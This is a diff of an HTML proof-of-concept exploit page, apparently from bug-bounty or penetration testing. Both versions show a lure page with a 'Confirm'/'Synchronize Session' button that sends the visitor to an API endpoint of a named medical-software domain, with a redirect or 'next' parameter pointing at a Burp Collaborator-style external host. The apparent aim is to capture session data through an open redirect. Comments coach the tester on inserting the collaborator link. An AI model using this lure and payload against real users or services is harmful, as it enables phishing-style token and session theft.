@@ -2,37 +2,22 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Synchronizing Account Profile</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background: #fafafa; }
-        .box { display: inline-block; padding: 40px; background: white; border: 1px solid #e0e0e0; border-radius: 8px; }
-        .btn { background: #007bff; color: white; padding: 14px 28px; font-size: 16px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
-    </style>
+    <title>Session Update</title>
 </head>
 <body>
+    <h2>Synchronizing Session...</h2>
+    <button id="exploitBtn">Confirm</button>
 
-<div class="box">
-    <h2>Account Synchronisation</h2>
-    <p>Click below to authorize token refresh.</p>
-    <br>
-    <button id="exploitBtn" class="btn">Synchronize Session Now</button>
-</div>
-<script>
-    document.getElementById('exploitBtn').addEventListener('click', () => {
-        // 1. Base API URL (Do NOT put any parameters or question marks here)
-        const targetUrl = new URL("https://ocean.medishout.co.uk/v1/users/me/?platform=web");
+    <script>
+        document.getElementById('exploitBtn').addEventListener('click', () => {
+            // Target the front-end page rather than the raw API path
+            const targetUrl = new URL("https://ocean.medishout.co.uk/v1/users/me/?platform=web");
+            
+            // Route the redirect parameter directly to your collaborator instance
+            targetUrl.searchParams.set("next", "https://jg39biz25cuv9snz767pvduxfolg9axz.k.e-secureapp.com");
 
-        // 2. Safely add the individual parameters. The browser handles '&' and encoding automatically.
-        targetUrl.searchParams.set("platform", "web");
-        
-        // 3. Put your exact Burp Collaborator link here
-        targetUrl.searchParams.set("redirect", "https://a2d0x9ltr3gmvj9qtxtgh4go1f77v0jp.k.e-secureapp.com");
-
-        // 4. Trigger the top-level navigation
-        console.log("Navigating to: ", targetUrl.toString()); // Verify in console first
-        window.location.href = targetUrl.toString();
-    });
-</script>
-
+            window.location.href = targetUrl.toString();
+        });
+    </script>
 </body>
 </html>
